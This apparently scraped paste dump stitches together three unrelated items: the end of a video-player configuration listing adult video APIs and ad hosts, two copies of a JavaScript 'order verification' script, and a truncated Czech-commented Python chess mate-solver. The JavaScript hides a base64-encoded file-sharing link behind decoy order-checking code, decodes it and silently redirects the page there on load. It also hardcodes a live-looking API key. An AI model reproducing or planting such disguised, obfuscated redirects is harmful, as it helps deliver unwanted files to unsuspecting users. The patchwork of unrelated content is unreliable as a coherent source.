{""key"":""老鸭资源"",""name"":""老鸭资源(🔞)"",""type"":0,""api"":""https://api.apilyzy.com/api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""老色逼云"",""name"":""老色逼云(🔞)"",""type"":0,""api"":""https://apilsbzy1.com/api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""色南国云"",""name"":""色南国云(🔞)"",""type"":0,""api"":""https://api.sexnguon.com/api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""奥斯卡云"",""name"":""奥斯卡云(🔞)"",""type"":0,""api"":""https://aosikazy.com/api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""久久热云"",""name"":""久久热云(🔞)"",""type"":0,""api"":""https://99reapi.com/api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""狼少年云"",""name"":""狼少年云(🔞)"",""type"":0,""api"":""http://cjmygzy.com/inc/sapi.php?ac=videolist"",""playerUrl"":""""},
{""key"":""越资源云"",""name"":""越资源云(🔞)"",""type"":0,""api"":""https://apilsbzy1.com/api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""金坤资源"",""name"":""金坤资源(🔞)"",""type"":0,""api"":""https://www.jkunzyapi.com/api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""一五五云"",""name"":""一五五云(🔞)"",""type"":0,""api"":""https://155api.com/api.php/provide/vod/vod/at/xml"",""playerUrl"":""""},
{""key"":""九九八云"",""name"":""九九八云(🔞)"",""type"":0,""api"":""https://api.998zy.com/api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""探探资源"",""name"":""探探资源(🔞)"",""type"":0,""api"":""https://apittzy.com/api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""色猫资源"",""name"":""色猫资源(🔞)"",""type"":0,""api"":""https://caiji.semaozy.net/inc/api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""秀人资源"",""name"":""秀人资源(🔞)"",""type"":0,""api"":""https://xiuren.site/api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""嘛唞资源"",""name"":""嘛唞资源(🔞)"",""type"":0,""api"":""https://madoucun.com/api.php/provide/vod/at/xml"",""playerUrl"":""""}],
#直播
""lives"":[{""group"":""redirect"",""channels"":[{""name"":""live"",""urls"":[""proxy://do=live&type=txt&ext=aHR0cHM6Ly9naXRlZS5jb20vbGlsaWFuZzc0MTIwL2N4a2o2ODYzL3Jhdy9tYXN0ZXIvbXlEUw==""]}]}],
#解析
""parses"":[
{""name"":""聚合"",""type"":3,""url"":""Demo""},
{""name"":""并发"",""type"":2,""url"":""Parallel""},
{""name"":""轮询"",""type"":2,""url"":""Sequence""},
{""name"":""春风"",""type"":1,""url"":""https://jx.xyflv.cc/?url=""},
{""name"":""夏雨"",""type"":1,""url"":""https://jx.77flv.cc/?url=""},
{""name"":""秋霜"",""type"":1,""url"":""https://jx.xymp4.cc/?url=""},
{""name"":""冬雪"",""type"":1,""url"":""https://jx.xmflv.com/?url=""}],
""flags"":[""youku"",""qq"",""iqiyi"",""imgo"",""m1905"",""letv"",""sohu"",""pptv"",""dbm3u8"",""mgtv"",""wasu"",""bilibili"",""renrenmi"",""xigua"",""ltnb"",""rx"",""CL4K"",""xfyun""],  
#解码    
""ijk"":[{""group"":""软解码"",""options"":[
{""category"":4,""name"":""opensles"",""value"":""0""},
{""category"":4,""name"":""overlay-format"",""value"":""842225234""},
{""category"":4,""name"":""framedrop"",""value"":""1""},
{""category"":4,""name"":""soundtouch"",""value"":""1""},
{""category"":4,""name"":""start-on-prepared"",""value"":""1""},
{""category"":1,""name"":""http-detect-range-support"",""value"":""0""},
{""category"":1,""name"":""fflags"",""value"":""fastseek""},
{""category"":2,""name"":""skip_loop_filter"",""value"":""48""},
{""category"":4,""name"":""reconnect"",""value"":""1""},
{""category"":4,""name"":""enable-accurate-seek"",""value"":""0""},
{""category"":4,""name"":""mediacodec"",""value"":""0""},
{""category"":4,""name"":""mediacodec-auto-rotate"",""value"":""0""},
{""category"":4,""name"":""mediacodec-handle-resolution-change"",""value"":""0""},
{""category"":4,""name"":""mediacodec-hevc"",""value"":""0""},
{""category"":1,""name"":""dns_cache_timeout"",""value"":""600000000""}]},
{""group"":""硬解码"",""options"":[
{""category"":4,""name"":""opensles"",""value"":""0""},
{""category"":4,""name"":""overlay-format"",""value"":""842225234""},
{""category"":4,""name"":""framedrop"",""value"":""1""},  
{""category"":4,""name"":""soundtouch"",""value"":""1""},
{""category"":4,""name"":""start-on-prepared"",""value"":""1""},
{""category"":1,""name"":""http-detect-range-support"",""value"":""0""},
{""category"":1,""name"":""fflags"",""value"":""fastseek""},
{""category"":2,""name"":""skip_loop_filter"",""value"":""48""},
{""category"":4,""name"":""reconnect"",""value"":""1""},
{""category"":4,""name"":""enable-accurate-seek"",""value"":""0""},
{""category"":4,""name"":""mediacodec"",""value"":""1""},
{""category"":4,""name"":""mediacodec-auto-rotate"",""value"":""1""},
{""category"":4,""name"":""mediacodec-handle-resolution-change"",""value"":""1""},
{""category"":4,""name"":""mediacodec-hevc"",""value"":""1""},
{""category"":1,""name"":""dns_cache_timeout"",""value"":""600000000""}]}],
""ads"":[""wan.51img1.com"",""iqiyi.hbuioo.com"",""vip.ffzyad.com"",""https://lf1-cdn-tos.bytegoofy.com/obj/tos-cn-i-dy/455ccf9e8ae744378118e4bd289288dd"",""mimg.0c1q0l.cn"",""www.googletagmanager.com"",""www.google-analytics.com"",""mc.usihnbcq.cn"",""mg.g1mm3d.cn"",""mscs.svaeuzh.cn"",""cnzz.hhttm.top"",""tp.vinuxhome.com"",""cnzz.mmstat.com"",""www.baihuillq.com"",""s23.cnzz.com"",""z3.cnzz.com"",""c.cnzz.com"",""stj.v1vo.top"",""z12.cnzz.com"",""img.mosflower.cn"",""tips.gamevvip.com"",""ehwe.yhdtns.com"",""xdn.cqqc3.com"",""www.jixunkyy.cn"",""sp.chemacid.cn"",""hm.baidu.com"",""s9.cnzz.com"",""z6.cnzz.com"",""um.cavuc.com"",""mav.mavuz.com"",""wofwk.aoidf3.com"",""z5.cnzz.com"",""xc.hubeijieshikj.cn"",""tj.tianwenhu.com"",""xg.gars57.cn"",""k.jinxiuzhilv.com"",""cdn.bootcss.com"",""ppl.xunzhuo123.com"",""xomk.jiangjunmh.top"",""img.xunzhuo123.com"",""z1.cnzz.com"",""s13.cnzz.com"",""xg.huataisangao.cn"",""z7.cnzz.com"",""xg.huataisangao.cn"",""z2.cnzz.com"",""s96.cnzz.com"",""q11.cnzz.com"",""thy.dacedsfa.cn"",""xg.whsbpw.cn"",""s19.cnzz.com"",""z8.cnzz.com"",""s4.cnzz.com"",""f5w.as12df.top"",""ae01.alicdn.com"",""www.92424.cn"",""k.wudejia.com"",""vivovip.mmszxc.top"",""qiu.xixiqiu.com"",""cdnjs.hnfenxun.com"",""cms.qdwght.com""]}"
xnTCzYHn,Products.js,kammex,JavaScript,Monday 31st of March 2025 05:33:57 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/650/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
YDF0nuMv,Order.js,kammex,JavaScript,Monday 31st of March 2025 05:06:49 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/653/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
z6ZLpEFH,korektni qkK i s casem na jednom radku a inf casem,max2201111,Python,Monday 31st of March 2025 04:44:54 PM CDT,"#!/usr/bin/env python3
import time
import threading
import sys
from math import inf

# Globální konstanty – pohyby jezdce (relativní souřadnice)
knight_moves = [(2,1),(2,-1),(-2,1),(-2,-1),(1,2),(1,-2),(-1,2),(-1,-2)]

# Globální proměnné pro sledování času
running = False
start_time = 0

###############################################################################
# Funkce pro výpis času v samostatném vlákně
###############################################################################

def time_reporter():
    """"""Funkce pro výpis aktuálního času každou sekundu na stejném řádku.""""""
    global running, start_time
    while running:
        elapsed = time.time() - start_time
        hrs = int(elapsed // 3600)
        mins = int((elapsed % 3600) // 60)
        secs = int(elapsed % 60)
        
        # Použijeme \r pro návrat na začátek řádku a přepsání předchozího výpisu
        sys.stdout.write(f""\r[INFO] Uplynulý čas: {hrs:02d}h {mins:02d}m {secs:02d}s"")
        sys.stdout.flush()
        
        time.sleep(1)

###############################################################################
# Třída Board – reprezentuje šachovnici a umí ji inicializovat z FEN řetězce.
###############################################################################

class Board:
    def __init__(self, fen=None):
        """"""Inicializace šachovnice; pokud je zadán FEN, nastaví pozici podle něj.""""""
        self.grid = [[' ' for _ in range(8)] for _ in range(8)]
        self.to_move = 'w'
        self.castling_rights = set()  # např. {'K','Q','k','q'}
        self.en_passant = None       # (row, col) nebo None
        self.halfmove_clock = 0
        self.fullmove_number = 1
        if fen:
            self.set_fen(fen)
    
    def set_fen(self, fen):
        """"""Nastaví šachovnici podle FEN řetězce.""""""
        parts = fen.split()
        while len(parts) < 6:
            parts.append('0')
        board_part, turn_part = parts[0], parts[1]
        castling_part = parts[2] if len(parts) > 2 else '-'
        en_passant_part = parts[3] if len(parts) > 3 else '-'
        halfmove = parts[4] if len(parts) > 4 else '0'
        fullmove = parts[5] if len(parts) > 5 else '1'
        self.grid = [['.' for _ in range(8)] for _ in range(8)]
        ranks = board_part.split('/')
        # FEN řady začínají od horní (8.) a jdou dolů
        for rank_idx, rank_str in enumerate(ranks):
            file_idx = 0
            for ch in rank_str:
                if ch.isdigit():
                    file_idx += int(ch)
                else:
                    self.grid[rank_idx][file_idx] = ch
                    file_idx += 1
        self.to_move = 'w' if turn_part == 'w' else 'b'
        self.castling_rights = set() if castling_part == '-' else set(castling_part)
        self.en_passant = None
        if en_passant_part != '-' and en_passant_part != '':
            file = ord(en_passant_part[0]) - ord('a')
            rank = int(en_passant_part[1])
            ri = 8 - rank
            fi = file
            if 0 <= ri < 8 and 0 <= fi < 8:
                self.en_passant = (ri, fi)
        try:
            self.halfmove_clock = int(halfmove)
        except:
            self.halfmove_clock = 0
        try:
            self.fullmove_number = int(fullmove)
        except:
            self.fullmove_number = 1
    
    def copy(self):
        """"""Vytvoří hlubokou kopii šachovnice.""""""
        new_board = Board()
        new_board.grid = [row.copy() for row in self.grid]
        new_board.to_move = self.to_move
        new_board.castling_rights = set(self.castling_rights)
        new_board.en_passant = None if self.en_passant is None else (self.en_passant[0], self.en_passant[1])
        new_board.halfmove_clock = self.halfmove_clock
        new_board.fullmove_number = self.fullmove_number
        return new_board

    def display(self):
        """"""Vrátí textovou reprezentaci šachovnice.""""""
        lines = []
        for ri in range(8):
            line = """"
            for fi in range(8):
                line += self.grid[ri][fi] + "" ""
            lines.append(line)
        return ""\n"".join(lines)

###############################################################################
# Funkce pro detekci šachu, generování tahů a jejich provádění
###############################################################################

def find_king(board, side):
    """"""Najde pozici krále pro stranu 'w' nebo 'b'.""""""
    target = 'K' if side=='w' else 'k'
    for r in range(8):
        for c in range(8):
            if board.grid[r][c] == target:
                return (r, c)
    return None

def is_square_attacked(board, r, c, by_side):
    """"""Zjistí, zda je pole (r,c) napadeno stranou by_side.""""""
    # Útoky pěšcem
    if by_side == 'b':
        if r+1 < 8 and c-1 >= 0 and board.grid[r+1][c-1] == 'p': return True
        if r+1 < 8 and c+1 < 8 and board.grid[r+1][c+1] == 'p': return True
    else:
        if r-1 >= 0 and c-1 >= 0 and board.grid[r-1][c-1] == 'P': return True
        if r-1 >= 0 and c+1 < 8 and board.grid[r-1][c+1] == 'P': return True
    
    # Útoky jezdcem a dalšími s jezdcovým pohybem (N, A, C, E)
    enemy_knights = ['n','a','c','e'] if by_side=='b' else ['N','A','C','E']
    for dr, dc in knight_moves:
        nr, nc = r+dr, c+dc
        if 0<=nr<8 and 0<=nc<8 and board.grid[nr][nc] in enemy_knights:
            return True
    
    # Útoky po řadách/sloupcích (R, Q, E, A)
    enemy_rook_like = ['r','q','e','a'] if by_side=='b' else ['R','Q','E','A']
    for dr, dc in [(1,0),(-1,0),(0,1),(0,-1)]:
        nr, nc = r+dr, c+dc
        while 0<=nr<8 and 0<=nc<8:
            if board.grid[nr][nc] != '.':
                if board.grid[nr][nc] in enemy_rook_like:
                    return True
                break
            nr += dr; nc += dc
    
    # Útoky diagonálně (B, Q, C, A)
    enemy_bishop_like = ['b','q','c','a'] if by_side=='b' else ['B','Q','C','A']
    for dr, dc in [(1,1),(1,-1),(-1,1),(-1,-1)]:
        nr, nc = r+dr, c+dc
        while 0<=nr<8 and 0<=nc<8:
            if board.grid[nr][nc] != '.':
                if board.grid[nr][nc] in enemy_bishop_like:
                    return True
                break
            nr += dr; nc += dc
    
    # Sousední král
    enemy_king = 'k' if by_side=='b' else 'K'
    for dr in [-1,0,1]:
        for dc in [-1,0,1]:
            if dr==0 and dc==0: continue
            nr, nc = r+dr, c+dc
            if 0<=nr<8 and 0<=nc<8 and board.grid[nr][nc] == enemy_king:
                return True
    
    return False

def is_in_check(board, side):
    """"""Zjistí, zda je král strany side ('w' nebo 'b') v šachu.""""""
    king_pos = find_king(board, side)
    if not king_pos:
        return False
    kr, kc = king_pos
    enemy_side = 'b' if side=='w' else 'w'
    return is_square_attacked(board, kr, kc, enemy_side)

def generate_pseudo_moves(board, side):
    """"""Generuje všechny pseudolegální tahy pro stranu side ('w' nebo 'b').""""""
    moves = []
    enemy = 'b' if side=='w' else 'w'
    is_white = (side=='w')
    pawn_dir = -1 if is_white else 1
    start_rank = 6 if is_white else 1
    promote_rank = 0 if is_white else 7
    for r in range(8):
        for c in range(8):
            piece = board.grid[r][c]
            if piece == '.': continue
            if is_white and not piece.isupper(): continue
            if not is_white and not piece.islower(): continue
            pt = piece.upper()
            if pt == 'P':
                nr = r + pawn_dir
                if 0<=nr<8 and board.grid[nr][c]=='.':
                    if nr==promote_rank:
                        for promo in ['Q','R','B','N','A','E','C']:
                            moves.append((r, c, nr, c, promo if is_white else promo.lower(), None))
                    else:
                        moves.append((r, c, nr, c, None, None))
                    if r==start_rank and board.grid[r+pawn_dir*2][c]=='.' and board.grid[r+pawn_dir][c]=='.':
                        moves.append((r, c, r+pawn_dir*2, c, None, 'double'))
                for dc in [-1,1]:
                    nc = c + dc
                    if 0<=nc<8 and 0<=nr<8:
                        if board.grid[nr][nc] != '.' and ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                            if nr==promote_rank:
                                for promo in ['Q','R','B','N','A','E','C']:
                                    moves.append((r, c, nr, nc, promo if is_white else promo.lower(), None))
                            else:
                                moves.append((r, c, nr, nc, None, None))
                        if board.en_passant == (nr, nc):
                            moves.append((r, c, nr, nc, None, 'enpassant'))
            elif pt == 'K':
                for dr in [-1,0,1]:
                    for dc in [-1,0,1]:
                        if dr==0 and dc==0: continue
                        nr, nc = r+dr, c+dc
                        if 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.' or ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                moves.append((r, c, nr, nc, None, None))
                # Rošády (základní verze)
                if is_white and r==7 and c==4:
                    if 'K' in board.castling_rights and board.grid[7][5]=='.' and board.grid[7][6]=='.':
                        moves.append((7,4,7,6,None,'castle'))
                    if 'Q' in board.castling_rights and board.grid[7][3]=='.' and board.grid[7][2]=='.' and board.grid[7][1]=='.':
                        moves.append((7,4,7,2,None,'castle'))
                if not is_white and r==0 and c==4:
                    if 'k' in board.castling_rights and board.grid[0][5]=='.' and board.grid[0][6]=='.':
                        moves.append((0,4,0,6,None,'castle'))
                    if 'q' in board.castling_rights and board.grid[0][3]=='.' and board.grid[0][2]=='.' and board.grid[0][1]=='.':
                        moves.append((0,4,0,2,None,'castle'))
            else:
                # Tahy pro figury s jezdcovým pohybem (N, A, C, E)
                if pt in ['N','A','C','E']:
                    for dr, dc in knight_moves:
                        nr, nc = r+dr, c+dc
                        if 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.' or ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                moves.append((r, c, nr, nc, None, None))
                # Klouzavé tahy – pro R, Q, E, A
                if pt in ['R','Q','E','A']:
                    for dr, dc in [(1,0),(-1,0),(0,1),(0,-1)]:
                        nr, nc = r+dr, c+dc
                        while 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.':
                                moves.append((r, c, nr, nc, None, None))
                            else:
                                if ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                    moves.append((r, c, nr, nc, None, None))
                                break
                            nr += dr; nc += dc
                if pt in ['B','Q','C','A']:
                    for dr, dc in [(1,1),(1,-1),(-1,1),(-1,-1)]:
                        nr, nc = r+dr, c+dc
                        while 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.':
                                moves.append((r, c, nr, nc, None, None))
                            else:
                                if ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                    moves.append((r, c, nr, nc, None, None))
                                break
                            nr += dr; nc += dc
    return moves

def get_legal_moves(board, side):
    """"""Vrátí seznam legálních tahů pro danou stranu.""""""
    moves = generate_pseudo_moves(board, side)
    legal_moves = []
    for move in moves:
        make_move(move, board)
        if not is_in_check(board, side):
            legal_moves.append(move)
        undo_move(board)
    return legal_moves

# Zásobník pro tahy (pro undo)
move_stack = []

def make_move(move, board):
    """"""Provede tah na šachovnici a uloží stav pro možnost undo.
       move: (r1, c1, r2, c2, promo, special)""""""
    r1, c1, r2, c2, promo, special = move
    piece = board.grid[r1][c1]
    captured = board.grid[r2][c2] if special != 'enpassant' else ('p' if piece=='P' else 'P')
    prev_state = (set(board.castling_rights), board.en_passant)
    move_stack.append((r1, c1, r2, c2, promo, special, piece, captured, prev_state))
    board.grid[r1][c1] = '.'
    if special == 'castle':
        board.grid[r2][c2] = piece
        if piece == 'K':
            if c2 == 6:
                board.grid[7][5] = 'R'; board.grid[7][7] = '.'
            else:
                board.grid[7][3] = 'R'; board.grid[7][0] = '.'
        else:
            if c2 == 6:
                board.grid[0][5] = 'r'; board.grid[0][7] = '.'
            else:
                board.grid[0][3] = 'r'; board.grid[0][0] = '.'
    elif special == 'enpassant':
        board.grid[r2][c2] = piece
        if piece == 'P':
            board.grid[r2+1][c2] = '.'
        else:
            board.grid[r2-1][c2] = '.'
    else:
        board.grid[r2][c2] = promo if promo else piece
    if piece == 'K':
        board.castling_rights.discard('K'); board.castling_rights.discard('Q')
    if piece == 'k':
        board.castling_rights.discard('k'); board.castling_rights.discard('q')
    if piece == 'R' and (r1, c1)==(7,7):
        board.castling_rights.discard('K')
    if piece == 'R' and (r1, c1)==(7,0):
        board.castling_rights.discard('Q')
    if piece == 'r' and (r1, c1)==(0,7):
        board.castling_rights.discard('k')
    if piece == 'r' and (r1, c1)==(0,0):
        board.castling_rights.discard('q')
    if special == 'double':
        board.en_passant = (r1 + (-1 if board.to_move=='w' else 1), c1)
    else:
        board.en_passant = None
    board.to_move = 'b' if board.to_move=='w' else 'w'

def undo_move(board):
    """"""Vrátí poslední provedený tah.""""""
    r1, c1, r2, c2, promo, special, piece, captured, prev_state = move_stack.pop()
    board.grid[r1][c1] = piece
    if special == 'castle':
        board.grid[r2][c2] = '.'
        if piece == 'K':
            if c2 == 6:
                board.grid[7][7] = 'R'; board.grid[7][5] = '.'
            else:
                board.grid[7][0] = 'R'; board.grid[7][3] = '.'
        else:
            if c2 == 6:
                board.grid[0][7] = 'r'; board.grid[0][5] = '.'
            else:
                board.grid[0][0] = 'r'; board.grid[0][3] = '.'
    elif special == 'enpassant':
        board.grid[r2][c2] = '.'
        if piece == 'P':
            board.grid[r2+1][c2] = 'p'
        else:
            board.grid[r2-1][c2] = 'P'
    else:
        board.grid[r2][c2] = captured
    board.castling_rights, board.en_passant = prev_state
    board.to_move = 'b' if board.to_move=='w' else 'w'

###############################################################################
# Jednoduchá funkce pro zjištění, zda je mat v určité hloubce 
# (pro pomoc s detekcí matů za určitý počet tahů)
###############################################################################

def is_mate_in_n(board, side, depth):
    """"""Zkontroluje, zda je pozice mat (pro stranu side) v zadané hloubce.""""""
    if depth == 0:
        # Kontrola matu
        legal_moves = get_legal_moves(board, side)
        return not legal_moves and is_in_check(board, side)
    
    # Rekurzivní kontrola pro stranu side (zda má vynucený mat)
    legal_moves = get_legal_moves(board, side)
    
    if not legal_moves:
        return False  # Nemáme tahy, nemůžeme dát mat
    
    # Zkontrolujeme všechny tahy, musí existovat alespoň jeden, který vede k matu
    opponent = 'b' if side=='w' else 'w'
    for move in legal_moves:
        make_move(move, board)
        # Pro všechny odpovědi protivníka musí být mat
        opponent_can_avoid_mate = False
        opponent_legal_moves = get_legal_moves(board, opponent)
        
        if not opponent_legal_moves:
            # Protivník nemá tahy - buď je to mat nebo pat
            if is_in_check(board, opponent):
                undo_move(board)
                return True  # Již nyní máme mat
            # Jinak je to pat a to není výhra
        
        # Pokud má protivník tahy, musíme prověřit všechny
        for op_move in opponent_legal_moves:
            make_move(op_move, board)
            if not is_mate_in_n(board, side, depth-1):
                opponent_can_avoid_mate = True
            undo_move(board)
            if opponent_can_avoid_mate:
                break
        
        undo_move(board)
        
        # Pokud protivník nemůže vyhnout matu, máme mat za 'depth' tahů
        if not opponent_can_avoid_mate:
            return True
    
    return False

###############################################################################
# Negamax s alfa-beta ořezáváním pro hledání nejlepší sekvence
###############################################################################

def negamax(board, depth, alpha, beta, side):
    """"""Negamax s alfa-beta ořezáváním.
       side: 1 pro bílého, -1 pro černého.
       Vrací (hodnota, tahová sekvence).""""""
    # Koncové podmínky - mat (nebo pat když depth=0)
    curr_color = 'w' if side == 1 else 'b'
    legal_moves = get_legal_moves(board, curr_color)
    
    # Kontrola na mat nebo pat (terminální stavy)
    if not legal_moves:
        if is_in_check(board, curr_color):
            return -inf, []  # Mat
        return 0, []  # Pat
    
    # Dosáhli jsme maximální hloubky - základní ohodnocení
    if depth == 0:
        # Kontrola, zda máme mat v nejbližších tazích
        enemy_color = 'b' if curr_color == 'w' else 'w'
        for move in legal_moves:
            make_move(move, board)
            enemy_legal_moves = get_legal_moves(board, enemy_color)
                
            if not enemy_legal_moves and is_in_check(board, enemy_color):
                undo_move(board)
                return inf, [move]  # Našli jsme mat
            undo_move(board)
        
        # Pro jednoduchost zde neohodnocujeme materiál, pozici atd.
        # V reálném šachovém enginu bychom zde vraceli pozici na základě materiálu, struktury pěšců atd.
        return 0, []
    
    best_val = -inf
    best_line = []
    
    # Seřazení tahů pro alfa-beta
    legal_moves.sort(key=lambda m: 1 if board.grid[m[2]][m[3]] != '.' else 0, reverse=True)
    
    for move in legal_moves:
        make_move(move, board)
        val, line = negamax(board, depth-1, -beta, -alpha, -side)
        val = -val
        undo_move(board)
        
        if val > best_val:
            best_val = val
            best_line = [move] + line
        
        alpha = max(alpha, best_val)
        if alpha >= beta:
            break
    
    return best_val, best_line

###############################################################################
# Iterativní prohlubování – hledáme do maximální hloubky a vypisujeme uplynulý čas
###############################################################################

def iterative_deepening(board, max_depth=50, time_limit=300):
    """"""Iterativní prohlubování s časovým limitem (výchozí 5 minut).""""""
    global running, start_time
    
    # Spuštění časovacího vlákna
    running = True
    start_time = time.time()
    timer_thread = threading.Thread(target=time_reporter)
    timer_thread.daemon = True
    timer_thread.start()
    
    best_line = []
    best_val = 0
    
    try:
        # Nejdříve zkontrolujeme, zda máme vůbec nějaké legální tahy
        curr_side = board.to_move
        enemy_side = 'b' if curr_side=='w' else 'w'
        
        legal_moves = get_legal_moves(board, curr_side)
        
        # Pokud nemáme žádné legální tahy, je to pat nebo mat
        if not legal_moves:
            total_elapsed = time.time() - start_time
            running = False
            if is_in_check(board, curr_side):
                return -inf, [], total_elapsed  # Mat
            return 0, [], total_elapsed  # Pat
        
        # Zkontrolujeme, zda máme mat v jednom tahu
        for move in legal_moves:
            make_move(move, board)
            enemy_legal = get_legal_moves(board, enemy_side)
            
            if not enemy_legal and is_in_check(board, enemy_side):
                # Našli jsme mat v jednom tahu
                undo_move(board)
                running = False
                return inf, [move], 0.1
            undo_move(board)
        
        # Pokud máme jen jeden legální tah, vrátíme ho bez dalšího počítání
        if len(legal_moves) == 1:
            running = False
            return 0, legal_moves, 0.1
        
        # Nyní začněme iterativní prohlubování
        for depth in range(1, max_depth+1):
            t0 = time.time()
            val, line = negamax(board, depth, -inf, inf, 1 if board.to_move=='w' else -1)
            t1 = time.time()
            elapsed = time.time() - start_time
            
            # Výpis času po dosažení každé hloubky
            hrs = int(elapsed // 3600)
            mins = int((elapsed % 3600) // 60)
            secs = int(elapsed % 60)
            
            # Po výpisu každé hloubky přejdeme na nový řádek
            move_time = t1 - t0
            sys.stdout.write(""\n"")  # Nový řádek po časovém informačním řádku
            print(f""Hloubka {depth:2d} – uplynulý čas: {hrs:02d}h {mins:02d}m {secs:02d}s (poslední krok: {move_time:.2f}s)"")
            
            # Aktualizujeme nejlepší nalezenou sekvenci
            best_val = val
            best_line = line
            
            # Pokud jsme našli vynucený mat nebo pat, končíme
            if abs(val) == inf or time.time() - start_time > time_limit:
                if time.time() - start_time > time_limit:
                    print(f""Časový limit vypršel po {time_limit} sekundách"")
                break
        
        # Ověření, že když máme tahy, tak vrátíme nejlepší z nich (i když je remíza)
        if not best_line and legal_moves:
            best_line = [legal_moves[0]]
                
        total_elapsed = time.time() - start_time
        return best_val, best_line, total_elapsed
    
    finally:
        # Zajistíme ukončení časovacího vlákna
        running = False
        timer_thread.join(timeout=1.0)
        # Přejdeme na nový řádek po posledním časovém výpisu
        sys.stdout.write(""\n"")
        sys.stdout.flush()

###############################################################################
# Testovací funkce pro kontrolu, zda jsou tahy e4 správně generovány
###############################################################################

def debug_king_moves(fen=""8/8/8/8/8/kq2K3/8/8 w - - 0 1""):
    """"""Testovací funkce pro zobrazení generovaných tahů krále.""""""
    board = Board(fen)
    print(""Pozice:"")
    print(board.display())
    
    side = board.to_move
    king_pos = find_king(board, side)
    if not king_pos:
        print(""Král nenalezen!"")
        return
    
    kr, kc = king_pos
    print(f""Král na pozici: {'abcdefgh'[kc]}{8-kr} ({kr},{kc})"")
    
    # Generujeme tahy krále
    king_moves = []
    for dr in [-1, 0, 1]:
        for dc in [-1, 0, 1]:
            if dr == 0 and dc == 0:
                continue
            nr, nc = kr + dr, kc + dc
            if 0 <= nr < 8 and 0 <= nc < 8:
                king_moves.append((nr, nc))
    
    print(""Možné tahy krále:"")
    for nr, nc in king_moves:
        # Zjistíme, zda je tam vlastní figura
        piece = board.grid[nr][nc]
        enemy_side = 'b' if side == 'w' else 'w'
        attacked = is_square_attacked(board, nr, nc, enemy_side)
        
        status = """"
        if piece != '.':
            is_own = (side == 'w' and piece.isupper()) or (side == 'b' and piece.islower())
            if is_own:
                status = ""vlastní figura""
            else:
                status = f""soupeřova figura {piece}""
        
        if attacked:
            status += "" (napadeno)""
        
        if not status:
            status = ""volné pole""
        
        print(f""  {'abcdefgh'[nc]}{8-nr} ({nr},{nc}): {status}"")
    
    # Generování legálních tahů pomocí generate_pseudo_moves
    print(""\nLegální tahy podle generate_pseudo_moves:"")
    moves = generate_pseudo_moves(board, side)
    king_moves = []
    for move in moves:
        r1, c1, r2, c2, _, _ = move
        if r1 == kr and c1 == kc:
            king_moves.append(move)
    
    for move in king_moves:
        r1, c1, r2, c2, _, _ = move
        make_move(move, board)
        in_check = is_in_check(board, side)
        undo_move(board)
        
        print(f""  {'abcdefgh'[c1]}{8-r1} -> {'abcdefgh'[c2]}{8-r2}: {'nelegální (šach)' if in_check else 'legální'}"")

###############################################################################
# Převod tahu do šachové notace
###############################################################################

def move_to_notation(move):
    cols = ""abcdefgh""
    r1, c1, r2, c2, promo, special = move
    if special == 'castle':
        return ""O-O"" if c2 > c1 else ""O-O-O""
